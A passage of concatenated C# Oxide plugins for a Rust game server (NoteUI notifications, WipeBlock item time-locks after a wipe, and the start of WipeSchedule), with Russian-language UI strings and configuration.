            Interface.Oxide.DataFileSystem.WriteObject("TextPromoData", TextPromo2);
        }
        void OnServerInitialized()
        {
            TextPromo2 = Interface.Oxide.DataFileSystem.ReadObject<List<TextPromos>>("TextPromoData");
        }
    }
}

// --- End of file: TextPromo.cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/HudRust/NoteUI.cs ---
// --- Original Local Path: HudRust/NoteUI.cs ---

using System;
using System.Globalization;
using Newtonsoft.Json;
using Oxide.Core.Plugins;
using Oxide.Game.Rust.Cui;
using UnityEngine;

namespace Oxide.Plugins
{
    [Info("NoteUI", "noname", "1.0.1")]
    public class NoteUI : RustPlugin
    {
        #region Variables

        [PluginReference] private Plugin ImageLibrary;
        string NoteUIHandler = "NoteUI_Main";

        #endregion

        #region Config

        public class DataConfig
        {
            [JsonProperty("Иконка на эффект 'Взрыва'")]
            public string explosioneffecticon;
            [JsonProperty("Иконка на эффект 'Информация'")]
            public string infoeffecticon;
            [JsonProperty("Иконка на эффект 'Заблокировано'")]
            public string lockeffecticon;
            [JsonProperty("Включить звук при получении уведомления? (false - нет)")]
            public bool usesounds;
            [JsonProperty("Время постепенного появления")]
            public float fadein;
            [JsonProperty("Время через которое оповещение будет удалено")]
            public int timetodelete;
        }

        public DataConfig cfg;
        protected override void LoadConfig()
        {
            base.LoadConfig();
            cfg = Config.ReadObject<DataConfig>();
        }

        protected override void SaveConfig()
        {
            Config.WriteObject(cfg);
        }

        protected override void LoadDefaultConfig()
        {
            cfg = new DataConfig()
            {
                explosioneffecticon = "https://i.imgur.com/EKlH8Hy.png",
                lockeffecticon = "https://i.imgur.com/ETrXVzq.png",
                infoeffecticon = "https://i.imgur.com/nCAejF7.png",
				usesounds = true,
                fadein = 0.4f,
                timetodelete = 5,
            };
        }

        #endregion

        #region HooksAndMethods

        [HookMethod("DrawExplosionNote")]
        public void DrawExplosionNote(BasePlayer player, string Text, string Description)
        {
            if (player == null || Text == null || Description == null) return;
            NoteUIAdd(player, "explosion", Text, Description);
        }

        [HookMethod("DrawLockNote")]
        public void DrawLockNote(BasePlayer player, string Name, string Description)
        {
            if (player == null || Name == null || Description == null) return;
            NoteUIAdd(player, "lock", Name, Description);
        }

        [HookMethod("DrawInfoNote")]
        public void DrawInfoNote(BasePlayer player, string Text)
        {
            if (player == null || Text == null) return;
            var Description = "";
            NoteUIAdd(player, "info", Text, Description);
        }

        void OnServerInitialized()
        {
            if (!plugins.Exists("ImageLibrary"))
            {
                PrintWarning("Плагин 'ImageLibrary' не загружен, дальнейшая работа плагина невозможна!");
                Unload();
                return;
            }
            ImageLibrary.Call("AddImage", cfg.explosioneffecticon, "explosion");
            ImageLibrary.Call("AddImage", cfg.lockeffecticon, "lock");
            ImageLibrary.Call("AddImage", cfg.infoeffecticon, "info");
        }

        void Unload()
        {
            foreach (BasePlayer player in BasePlayer.activePlayerList)
            {
                CuiHelper.DestroyUi(player, NoteUIHandler);
            }
        }

        private void NoteUIAdd(BasePlayer player, string Type, string Name, string Description)
        {
            if (player.IsReceivingSnapshot || player.IsSleeping()) return;
            var container = new CuiElementContainer();
            CuiHelper.DestroyUi(player, NoteUIHandler);
            switch (Type)
            {
                case "explosion":
                    container.Add(new CuiPanel
                    {
                        Image = { FadeIn = cfg.fadein, Color = HexToCuiColor("#d4a1d400") },
                        RectTransform = { AnchorMin = "0.3011301 0.8373263", AnchorMax = "0.6792551 0.9283854" },
                        CursorEnabled = false,
                    }, "Hud", NoteUIHandler);
                    container.Add(new CuiElement
                    {
                        Parent = NoteUIHandler,
                        Components =
                        {
                            new CuiRectTransformComponent { AnchorMin = "0.008419432 0.4477783", AnchorMax = "0.0580062 0.9277781" },
                        }
                    });
                    container.Add(new CuiElement
                    {
                        Parent = NoteUIHandler,
                        Components =
                        {
                            new CuiTextComponent { FadeIn = cfg.fadein, Text = "Уведомление", Align = TextAnchor.MiddleCenter, FontSize = 16, Font = "RobotoCondensed-bold.ttf" },
                            new CuiRectTransformComponent {AnchorMin = "0.0709796 0.705116", AnchorMax = "0.9800709 1.293351"},
                            new CuiOutlineComponent {Color = "0 0 0 0", Distance = "0.3 0.3"}
                        }
                    });
                    container.Add(new CuiElement
                    {
                        Parent = NoteUIHandler,
                        Components =
                        {
                            new CuiTextComponent { FadeIn = cfg.fadein, Text = Name, Align = TextAnchor.MiddleLeft, FontSize = 12, Font = "RobotoCondensed-regular.ttf" },
                            new CuiRectTransformComponent {AnchorMin = "0.07438016 0.4799993", AnchorMax = "0.8181818 0.8799993"},
							new CuiOutlineComponent {Color = "0 0 0 0", Distance = "0.3 0.3"}
                        }
                    });
                    container.Add(new CuiElement
                    {
                        Parent = NoteUIHandler,
                        Components =
                        {
                            new CuiTextComponent { FadeIn = cfg.fadein, Text = Description, Align = TextAnchor.MiddleLeft, FontSize = 14, Font = "RobotoCondensed-regular.ttf" },
                            new CuiRectTransformComponent {AnchorMin = "0.07644629 0.1399995", AnchorMax = "0.9896694 0.5399995"},
							new CuiOutlineComponent {Color = "0 0 0 1", Distance = "0.3 0.3"}
                        }
                    });
                    break;
                case "lock":
                    container.Add(new CuiPanel
                    {
                        Image = { FadeIn = cfg.fadein, Color = HexToCuiColor("#d4a1d400") },
                        RectTransform = { AnchorMin = "0.3011301 0.8373263", AnchorMax = "0.6792551 0.9283854" },
                        CursorEnabled = false,
                    }, "Hud", NoteUIHandler);
                    container.Add(new CuiElement
                    {
                        Parent = NoteUIHandler,
                        Components =
                        {
                            new CuiRectTransformComponent { AnchorMin = "0.008419432 0.4477783", AnchorMax = "0.0580062 0.9277781" },
                        }
                    });
                    container.Add(new CuiElement
                    {
                        Parent = NoteUIHandler,
                        Components =
                        {
                            new CuiTextComponent { FadeIn = cfg.fadein, Text = "Уведомление", Align = TextAnchor.MiddleCenter, FontSize = 16, Font = "RobotoCondensed-bold.ttf" },
                            new CuiRectTransformComponent {AnchorMin = "0.0709796 0.6009494", AnchorMax = "0.9829992 1.189184"},
                            new CuiOutlineComponent {Color = "0 0 0 0", Distance = "0.3 0.3"}
                        }
                    });
                    container.Add(new CuiElement
                    {
                        Parent = NoteUIHandler,
                        Components =
                        {
                            new CuiTextComponent { FadeIn = cfg.fadein, Text = Name, Align = TextAnchor.MiddleCenter, FontSize = 16, Font = "RobotoCondensed-regular.ttf" },
                            new CuiRectTransformComponent {AnchorMin = "0.07438016 0.4799993", AnchorMax = "0.8181818 0.8799993"},
							new CuiOutlineComponent {Color = "0 0 0 0", Distance = "0.3 0.3"}
                        }
                    });
                    container.Add(new CuiElement
                    {
                        Parent = NoteUIHandler,
                        Components =
                        {
                            new CuiTextComponent { FadeIn = cfg.fadein, Text = Description, Align = TextAnchor.MiddleCenter, FontSize = 14, Font = "RobotoCondensed-regular.ttf" },
                            new CuiRectTransformComponent {AnchorMin = "0.07644629 0.1399995", AnchorMax = "0.9896694 0.5399995"},
							new CuiOutlineComponent {Color = "0 0 0 0", Distance = "0.3 0.3"}
                        }
                    });
                    break;
                case "info":
                    container.Add(new CuiPanel
                    {
                        Image = { FadeIn = cfg.fadein, Color = HexToCuiColor("#d4a1d400") },
                        RectTransform = { AnchorMin = "0.341142 0.8660589", AnchorMax = "0.636164 0.9132813" },
                        CursorEnabled = false,
                    }, "Hud", NoteUIHandler);
                    container.Add(new CuiElement
                    {
                        Parent = NoteUIHandler,
                        Components =
                        {
                            new CuiRectTransformComponent { AnchorMin = "0.01048555 0.1290863", AnchorMax = "0.06007232 0.8349687" },
                        }
                    });
                    container.Add(new CuiElement
                    {
                        Parent = NoteUIHandler,
                        Components =
                        {
                            new CuiTextComponent { FadeIn = cfg.fadein, Text = "Уведомление", Align = TextAnchor.MiddleCenter, FontSize = 16, Font = "RobotoCondensed-bold.ttf" },
                            new CuiRectTransformComponent {AnchorMin = "0.0709796 0.6009494", AnchorMax = "0.9829992 1.189184"},
                            new CuiOutlineComponent {Color = "0 0 0 0", Distance = "0.3 0.3"}
                        }
                    });
                    container.Add(new CuiElement
                    {
                        Parent = NoteUIHandler,
                        Components =
                        {
                            new CuiTextComponent { FadeIn = cfg.fadein, Text = Name, Align = TextAnchor.MiddleCenter, FontSize = 16, Font = "RobotoCondensed-regular.ttf" },
                            new CuiRectTransformComponent {AnchorMin = "0.07024754 0.1764701", AnchorMax = "0.9793388 0.7647049"},
							new CuiOutlineComponent {Color = "0 0 0 0", Distance = "0.3 0.3"}
                        }
                    });
                    break;
            }
            CuiHelper.AddUi(player, container);
			if (cfg.usesounds) Effect.server.Run("assets/bundled/prefabs/fx/notice/stack.world.fx.prefab", player, 0, Vector3.zero, Vector3.zero);
            timer.Once(cfg.timetodelete, () => CuiHelper.DestroyUi(player, NoteUIHandler));
        }

        #endregion

        #region Helpers

        private static string HexToCuiColor(string hex)
        {
            if (string.IsNullOrEmpty(hex)) hex = "#FFFFFFFF";
            var str = hex.Trim('#');
            if (str.Length == 6) str += "FF";
            if (str.Length != 8)
            {
                throw new Exception(hex);
                throw new InvalidOperationException("Cannot convert a wrong format.");
            }
            var r = byte.Parse(str.Substring(0, 2), NumberStyles.HexNumber);
            var g = byte.Parse(str.Substring(2, 2), NumberStyles.HexNumber);
            var b = byte.Parse(str.Substring(4, 2), NumberStyles.HexNumber);
            var a = byte.Parse(str.Substring(6, 2), NumberStyles.HexNumber);
            Color color = new Color32(r, g, b, a);
            return $"{color.r:F2} {color.g:F2} {color.b:F2} {color.a:F2}";
        }

        #endregion
    }
}

// --- End of file: NoteUI.cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/HudRust/WipeBlock.cs ---
// --- Original Local Path: HudRust/WipeBlock.cs ---

﻿using Oxide.Core;
using Oxide.Core.Plugins;
using Oxide.Game.Rust.Cui;
using System;
using System.Collections.Generic;
using System.Globalization;
using System.Linq;
using UnityEngine;

namespace Oxide.Plugins
{
    [Info("WipeBlock", "VooDoo", "1.0.0")]
    [Description("WipeBlock and Tab for XMenu")]
    public class WipeBlock : RustPlugin
    {
        [PluginReference] Plugin XMenu;
        [PluginReference] Plugin Notifications;
        public static WipeBlock instance;

        #region ImageLibrary Addon
        [PluginReference] Plugin ImageLibrary;
        bool AddImage(string url, string imageName, ulong imageId, Action callback = null) => (bool)ImageLibrary.Call("AddImage", url, imageName, imageId, callback);
        string GetImage(string imageName, ulong imageId = 0, bool returnUrl = false) => (string)ImageLibrary.Call("GetImage", imageName, imageId, returnUrl);
        #endregion

        #region Config
        private Dictionary<string, int> blockTime = new Dictionary<string, int>();
        private PluginConfig config;
        private class PluginConfig
        {
            public Dictionary<string, Dictionary<int, List<string>>> blockedItems;

            public ColorConfig colorConfig;
            public string serverName;
            public class ColorConfig
            {
                public string menuContentHighlighting;
                public string menuContentHighlightingalternative;

                public string menuContentText;
                public string menuContentTextAlternative;

                public string gradientColor;
            }
        }

        private void Init()
        {
            config = Config.ReadObject<PluginConfig>();
        }

        protected override void LoadDefaultConfig()
        {
            Config.WriteObject(GetDefaultConfig(), true);
        }

        private PluginConfig GetDefaultConfig()
        {
            return new PluginConfig
            {
                serverName = "<b>ЖИРНЫЙ <color=#D04425>RUST</color> X20 CLANS</b>",

                colorConfig = new PluginConfig.ColorConfig()
                {
                    menuContentHighlighting = "#0000007f",
                    menuContentHighlightingalternative = "#FFFFFF10",

                    menuContentTextAlternative = "#FFFFFFAA",
                    menuContentText = "#FFFFFFAA",

                    gradientColor = "#00000099",
                },

                blockedItems = new Dictionary<string, Dictionary<int, List<string>>>()
                {
                    ["Оружие"] = new Dictionary<int, List<string>>
                    {
                        [3600] = new List<string>
                        {
                            "crossbow",
                            "bow.compound",
                        },
                        [7200] = new List<string>
                        {
                            "shotgun.waterpipe",
                            "pistol.revolver",
                        },
                        [14400] = new List<string>
                        {
                            "pistol.semiauto",
                            "pistol.python",
                            "shotgun.double",
                            "shotgun.pump",
                        },
                        [28800] = new List<string>
                        {
                            "pistol.m92",
                            "shotgun.spas12",
                        },
                        [43200] = new List<string>
                        {

                            "rifle.semiauto",
                            "rifle.m39",
                        },
                        [57600] = new List<string>
                        {
                            "smg.2",
                            "smg.thompson",
                            "smg.mp5",
                            "surveycharge",
                            "grenade.beancan",
                            "grenade.f1",
                        },
                        [86400] = new List<string>
                        {
                            "rifle.bolt",
                            "rifle.ak",
                            "rifle.lr300",
                            "rifle.l96",
                            "lmg.m249",
                            "multiplegrenadelauncher",
                            "explosive.satchel",
                        },
                        [172800] = new List<string>
                        {
                            "rocket.launcher",
                            "explosive.timed"
                        },
                    },
                    ["Броня"] = new Dictionary<int, List<string>>
                    {
                        [57600] = new List<string>
                        {
                            "coffeecan.helmet",
                            "roadsign.jacket",
                            "roadsign.kilt"
                        },
                        [86400] = new List<string>
                        {
                            "metal.facemask",
                            "metal.plate.torso",
                            "heavy.plate.helmet",
                            "heavy.plate.jacket",
                            "heavy.plate.pants",
                        },
                    },
                    ["Боеприпасы"] = new Dictionary<int, List<string>>
                    {
                        [86400] = new List<string>
                        {
                            "ammo.rifle.explosive",
                        },
                        [172800] = new List<string>
                        {
                            "ammo.rocket.basic",
                            "ammo.rocket.fire",
                            "ammo.rocket.hv",
                        },
                    }
                }
            };
        }
        #endregion

        #region U'Mod Hook's
        private long SaveCreatedTime = 0;
        Timer TimerInitialize;
        private void OnServerInitialized()
        {
            instance = this;
            SaveCreatedTime = Interface.Oxide.DataFileSystem.ReadObject<long>("WipeBlock/WipeTime");
            if (SaveCreatedTime == 0)
            {
                SaveCreatedTime = ToEpoch(DateTime.UtcNow);
                Interface.Oxide.DataFileSystem.WriteObject("WipeBlock/WipeTime", SaveCreatedTime);
            }

            TimerInitialize = timer.Every(5f, () =>
            {
                if (XMenu.IsLoaded)
                {
                    XMenu.Call("API_RegisterMenu", this.Name, "WipeBlock", "assets/icons/bullet.png", "RenderWipeBlock", null);
                    cmd.AddChatCommand("wipeblock", this, (p, cmd, args) => rust.RunClientCommand(p, "custommenu true WipeBlock"));
                    TimerInitialize.Destroy();
                }
            });

            foreach (var category in config.blockedItems)
                foreach (var timeCategory in category.Value)
                    foreach (var item in timeCategory.Value)
                        blockTime.Add(item, timeCategory.Key);
        }

        private void OnNewSave()
        {
            SaveCreatedTime = ToEpoch(DateTime.UtcNow);
            Interface.Oxide.DataFileSystem.WriteObject("WipeBlock/WipeTime", SaveCreatedTime);
        }

        private bool? CanWearItem(PlayerInventory inventory, Item item)
        {

            var player = inventory.gameObject.ToBaseEntity() as BasePlayer;
            if (!player.userID.IsSteamId()) return null;

            var isBlocked = IsBlocked(item.info) > 0 ? false : (bool?)null;
            if (isBlocked == false) DrawBlock(player, item);
            return isBlocked;
        }

        private bool? CanEquipItem(PlayerInventory inventory, Item item)
        {
            var player = inventory.gameObject.ToBaseEntity() as BasePlayer;
            if (player == null || !player.userID.IsSteamId()) return null;
            if (player.IsAdmin) return null;

            var isBlocked = IsBlocked(item.info) > 0 ? false : (bool?)null;
            if (isBlocked == false) DrawBlock(player, item);
            return isBlocked;
        }

        private object OnReloadWeapon(BasePlayer player, BaseProjectile projectile)
        {
            if (!player.userID.IsSteamId()) return null;

            var isBlocked = IsBlocked(projectile.primaryMagazine.ammoType) > 0 ? false : (bool?)null;
            if (isBlocked == false) Notifications.Call("API_AddUINote", player.userID, $"Вы не можете использовать этот тип боеприпасов!");
            return isBlocked;
        }

        void OnWeaponFired(BaseProjectile projectile, BasePlayer player, ItemModProjectile mod, ProtoBuf.ProjectileShoot projectiles)
        {
            if (!player.userID.IsSteamId()) return;

            var isBlocked = IsBlocked(projectile.primaryMagazine.ammoType) > 0 ? false : (bool?)null;
            if (isBlocked == false)
            {
                projectile.primaryMagazine.contents = 0;
                projectile.GetItem().LoseCondition(projectile.GetItem().maxCondition);
                projectile.SendNetworkUpdate();
                player.SendNetworkUpdate();
                Item ammo = ItemManager.CreateByItemID(projectile.primaryMagazine.ammoType.itemid, 1, 0);
                Notifications.Call("API_AddUINote", player.userID, $"Хорошая попытка, правда ваше оружие теперь сломано!");
            }
        }


        private object OnReloadMagazine(BasePlayer player, BaseProjectile projectile)
        {
            if (!player.userID.IsSteamId())
                return null;
            if (player.IsAdmin)
                return null;

            NextTick(() =>
            {
                var isBlocked = IsBlocked(projectile.primaryMagazine.ammoType) > 0 ? false : (bool?)null;
                if (isBlocked == false)
                {
                    projectile.primaryMagazine.contents = 0;
                    projectile.GetItem().LoseCondition(projectile.GetItem().maxCondition);
                    projectile.SendNetworkUpdate();
                    player.SendNetworkUpdate();
                    Item ammo = ItemManager.CreateByItemID(projectile.primaryMagazine.ammoType.itemid, 1, 0);
                    Notifications.Call("API_AddUINote", player.userID, $"Хорошая попытка, правда ваше оружие теперь сломано!");
                }
            });
            return null;
        }

        private void DrawBlock(BasePlayer player, Item item)
        {
            string inputText = "Предмет {name} временно заблокирован, подождите {1}".Replace("{name}", item.info.displayName.english).Replace("{1}", $"{Convert.ToInt32(Math.Floor(TimeSpan.FromSeconds(IsBlocked(item.info)).TotalHours))} час. {TimeSpan.FromSeconds(IsBlocked(item.info)).Minutes} минут.");
            Notifications.Call("API_AddUINote", player.userID, inputText);
        }
        #endregion

        #region UI
        #region Layers
        public const string MenuLayer = "XMenu";
        public const string MenuItemsLayer = "XMenu.MenuItems";
        public const string MenuSubItemsLayer = "XMenu.MenuSubItems";
        public const string MenuContent = "XMenu.Content";
        #endregion

        private void RenderWipeBlock(ulong userID, object[] objects)
        {
            CuiElementContainer Container = (CuiElementContainer)objects[0];
            bool FullRender = (bool)objects[1];
            string Name = (string)objects[2];
            int ID = (int)objects[3];
            int Page = (int)objects[4];

            Container.Add(new CuiElement
            {
                Name = MenuContent,
                Parent = MenuLayer,
                Components =
                    {
                        new CuiImageComponent
                        {
                            Color = HexToRustFormat(config.colorConfig.menuContentHighlighting),
                        },
                        new CuiRectTransformComponent
                        {
                            AnchorMin = "0.5 0.5",
                            AnchorMax = "0.5 0.5",
                            OffsetMin = "-430 -230",
                            OffsetMax = "490 270"
                        },
                    }
            });

            Container.Add(new CuiElement
            {
                Name = MenuContent + $".Title",
                Parent = MenuContent,
                Components =
                    {
                        new CuiTextComponent
                        {
                            Text = $"<color={config.colorConfig.menuContentText}><b>ВАЙПОВАЯ БЛОКИРОВКА ПРЕДМЕТОВ НА СЕРВЕРЕ</b> <color={config.colorConfig.menuContentTextAlternative}>{config.serverName}</color>\n<size=24>Вайп сервера был произведён: {epoch.AddSeconds(SaveCreatedTime).ToString("dd-MM-yyyy")}</size></color>",
                            Align = TextAnchor.MiddleCenter,
                            FontSize = 30,
                            Font = "robotocondensed-regular.ttf",
                        },
                        new CuiRectTransformComponent
                        {
                            AnchorMin = "0 1",
                            AnchorMax = "0 1",
                            OffsetMin = $"0 -80",
                            OffsetMax = $"920 0",
                        }
                    }
            });
            for (int i = 0, x = 0, y = 3; i < config.blockedItems.Count; i++, x = 0)
            {
                Container.Add(new CuiElement
                {
                    Name = MenuContent + $".Category_{i}",
                    Parent = MenuContent,
                    Components =
                    {
                        new CuiTextComponent
                        {
                            Text = $"<color={config.colorConfig.menuContentText}>{config.blockedItems.ElementAt(i).Key}</color>",
                            Align = TextAnchor.MiddleCenter,
                            FontSize = 16,
                            Font = "robotocondensed-regular.ttf",
                        },
                        new CuiRectTransformComponent
                        {
                            AnchorMin = "0 1",
                            AnchorMax = "0 1",
                            OffsetMin = $"0 {50 - y * 55}",
                            OffsetMax = $"920 {100 - y * 55}",
                        }
                    }
                });
                y++;
                for (int j = 0; j < config.blockedItems.ElementAt(i).Value.Count; j++)
                {
                    for (int k = 0; k < config.blockedItems.ElementAt(i).Value.ElementAt(j).Value.Count; k++, x++)
                    {
                        if (x == 15)
                        {
                            x = 0;
                            y++;
                        }

                        Container.Add(new CuiElement
                        {
                            Name = MenuContent + $".Item_{k}",
                            Parent = MenuContent,
                            Components =
                            {
                                new CuiImageComponent
                                {
                                    Color = HexToRustFormat(config.colorConfig.menuContentHighlightingalternative),
                                },
                                new CuiRectTransformComponent
                                {
                                    AnchorMin = "0 1",
                                    AnchorMax = "0 1",
                                    OffsetMin = $"{35 + x * 55} {50 - y * 55}",
                                    OffsetMax = $"{85 + x * 55} {100 - y * 55}"
                                }
                            }
                        });
                        Container.Add(new CuiElement
                        {
                            Name = MenuContent + $".Item_{k}",
                            Parent = MenuContent,
                            Components =
                            {
                                new CuiRawImageComponent
                                {
                                    Png = GetImage(config.blockedItems.ElementAt(i).Value.ElementAt(j).Value.ElementAt(k)),
                                },
                                new CuiRectTransformComponent
                                {
                                    AnchorMin = "0 1",
                                    AnchorMax = "0 1",
                                    OffsetMin = $"{35 + x * 55} {50 - y * 55}",
                                    OffsetMax = $"{85 + x * 55} {100 - y * 55}"
                                }
                            }
                        });
                        string text = IsBlocked(config.blockedItems.ElementAt(i).Value.ElementAt(j).Value.ElementAt(k)) > 0
                        ? $"<color=#FFFFFFB3><size=9>ОСТАЛОСЬ\nЖДАТЬ:</size></color>\n\n<color=#FFAA00FF><size=11>{TimeSpan.FromSeconds((int)IsBlocked(config.blockedItems.ElementAt(i).Value.ElementAt(j).Value.ElementAt(k))).ToShortString()}</size></color>"
                        : "";
                        Container.Add(new CuiElement
                        {
                            Name = MenuContent + $".Item_{k}_Title",
                            Parent = MenuContent,
                            Components =
                            {
                                new CuiTextComponent
                                {
                                    Text = $"<color={config.colorConfig.menuContentText}>{text}</color>",
                                    Align = TextAnchor.MiddleCenter,
                                    FontSize = 6,
                                    Font = "robotocondensed-regular.ttf",
                                },
                                new CuiRectTransformComponent
                                {
                                    AnchorMin = "0 1",
                                    AnchorMax = "0 1",
                                    OffsetMin = $"{35 + x * 55} {50 - y * 55}",
                                    OffsetMax = $"{85 + x * 55} {100 - y * 55}"
                                }
                            }
                        });
                    }
                }
                y++;
            }
        }
        #endregion

        #region Helpers
        private static string HexToRustFormat(string hex)
        {
            if (string.IsNullOrEmpty(hex))
            {
                hex = "#FFFFFFFF";
            }

            var str = hex.Trim('#');

            if (str.Length == 6)
                str += "FF";

            if (str.Length != 8)
            {
                throw new Exception(hex);
                throw new InvalidOperationException("Cannot convert a wrong format.");
            }

            var r = byte.Parse(str.Substring(0, 2), NumberStyles.HexNumber);
            var g = byte.Parse(str.Substring(2, 2), NumberStyles.HexNumber);
            var b = byte.Parse(str.Substring(4, 2), NumberStyles.HexNumber);
            var a = byte.Parse(str.Substring(6, 2), NumberStyles.HexNumber);

            Color color = new Color32(r, g, b, a);

            return $"{color.r:F2} {color.g:F2} {color.b:F2} {color.a:F2}";
        }

        private double IsBlocked(ItemDefinition itemDefinition) => IsBlocked(itemDefinition.shortname);
        private double IsBlocked(string shortname)
        {
            if (!blockTime.ContainsKey(shortname))
                return 0;

            var lefTime = blockTime[shortname] + SaveCreatedTime - CurrentTime();

            return lefTime > 0 ? lefTime : 0;
        }

        private static readonly DateTime epoch = new DateTime(1970, 1, 1, 0, 0, 0);
        private static double CurrentTime() { return DateTime.UtcNow.Subtract(epoch).TotalSeconds; }
        private static string ToShortString(TimeSpan timeSpan)
        {
            int i = 0;
            string resultText = "";
            if (timeSpan.Days > 0)
            {
                resultText += timeSpan.Days + " День";
                i++;
            }
            if (timeSpan.Hours > 0 && i < 2)
            {
                if (resultText.Length != 0)
                    resultText += " ";
                resultText += timeSpan.Days + " Час";
                i++;
            }
            if (timeSpan.Minutes > 0 && i < 2)
            {
                if (resultText.Length != 0)
                    resultText += " ";
                resultText += timeSpan.Days + " Мин.";
                i++;
            }
            if (timeSpan.Seconds > 0 && i < 2)
            {
                if (resultText.Length != 0)
                    resultText += " ";
                resultText += timeSpan.Days + " Сек.";
                i++;
            }

            return resultText;
        }

        private long ToEpoch(DateTime dateTime) => (long)(dateTime - new DateTime(1970, 1, 1)).TotalSeconds;
        #endregion
    }
}

// --- End of file: WipeBlock.cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/HudRust/WipeSchedule.cs ---
// --- Original Local Path: HudRust/WipeSchedule.cs ---

﻿using System;
using System.Collections.Generic;
using System.Globalization;
using System.Linq;
using Newtonsoft.Json;
using Oxide.Core.Plugins;
using Oxide.Game.Rust.Cui;
using UnityEngine;

namespace Oxide.Plugins
{
    [Info("WipeSchedule", "Mevent", "1.0.4⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠")]
    public class WipeSchedule : RustPlugin
    {
        #region Fields⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠
        private string Layer = "UI_WipeSchedule";
        public enum Types
        {
            None,
            GLOBAL_WIPE,
            WIPE
        }

        private Dictionary<int, string> DaysOfWeek = new Dictionary<int, string>()
        {
            [1] = "Понедельник",
            [2] = "Вторник",
            [3] = "Среда",
            [4] = "Четверг",
            [5] = "Пятница",
            [6] = "Суббота",
            [7] = "Воскресенье",
        };

        public List<DayClass> DaysList = new List<DayClass>();

        public class DayClass
        {
            public int day;
            public string color;
            public Types types;
            public string description;
        }
        #endregion

